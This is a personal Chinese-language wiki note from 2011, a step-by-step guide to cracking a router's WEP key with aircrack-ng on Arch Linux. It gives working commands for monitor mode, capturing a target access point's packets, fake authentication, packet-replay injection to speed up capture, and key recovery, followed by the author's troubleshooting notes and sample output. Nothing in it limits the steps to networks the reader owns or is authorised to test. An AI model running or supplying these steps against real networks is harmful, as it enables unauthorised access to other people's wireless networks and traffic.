Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.4
Creation-Date: 2011-11-02T15:30:03+08:00

====== wifi加密破解 ======

系统：Archlinux，无线网卡：TP-LINK321G+，加密方式：WEP

破解前的准备：

安装aircrack-ng，安装iw（看需要）

破解过程：

1. 启动无线网卡的监控模式，终端中运行（wlan0是无线网卡的端口,可在终端中输入 ifconfig -a 查看）
$ sudo airmon-ng start wlan0

2.  查看有哪些采用wep加密的路由器（AP）在线及其详细信息（启动监控模式后无线网的端口是 mon0）
$ sudo airodump-ng mon0
然后按 ctrl+c 退出，保留终端

3. 另开一个终端,运行
$ sudo airodump-ng --channel 6 --bssid AP's_MAC -w wep mon0
其中6是AP的信道（channel），AP'sMAC是路由器的MAC地址，wep的是抓下来的数据包DATA保存的文件名

4. 再另开一个终端，与AP建立虚拟连接
$ sudo aireplay-ng -1 0 -a AP's_MAC -h My_MAC mon0

5. 建立虚拟连接成功后,运行
$ sudo aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b AP's_MAC -h My_MAC mon0
回头看下步骤3的终端是不是DATA在开始飞涨？

6. 收集5000个以上的DATA之后，开始进行解密 。另开一个终端，运行
$ sudo aircrack-ng wep*.cap
如果暂时没算出来的话，继续等，aircrack-ng 会在DATA每增加5000个之后自动再次运行，直到算出密码为止

7. 破解成功后，关闭监控模式
$ sudo airmon-ng stop mon0
我遇到的问题及其解决：
第一步，显示
ERROR: Neither the sysfs interface links nor the iw command is available.
Please download and install iw from http://dl.aircrack-ng.org/iw.tar.bz2
按提示安装iw即可

第四步，虚拟连接成功的话应该显示

12:52:28  Waiting for beacon frame (BSSID: 00:19:E0:XX:XX:XX) on channel 8
12:52:28  Sending Authentication Request (Open System) [ACK]
12:52:28  Authentication successful
12:52:28  Sending Association Request [ACK]
12:52:29  Association successful :-) (AID: 1)
但我的是不断地循环显示
13:04:56  Waiting for beacon frame (BSSID: 00:19:E0:XX:XX:XX) on channel 8

13:04:56  Sending Authentication Request (Open System) [ACK]
13:04:56  Authentication successful
13:04:56  Sending Association Request [ACK]
13:04:57  Got a deauthentication packet! (Waiting 3 seconds)
没关系，另开一个终端，继续第五步 （在经过若干次或长或短的循环后，也可能会虚拟连接成功）
我重新试了几次，发现第五步时前面的DATA不一定会“飞涨”，原因不明，也许是信号不好？
如果DATA增长缓慢，就不好破解了，所以只好重来，多试几次。
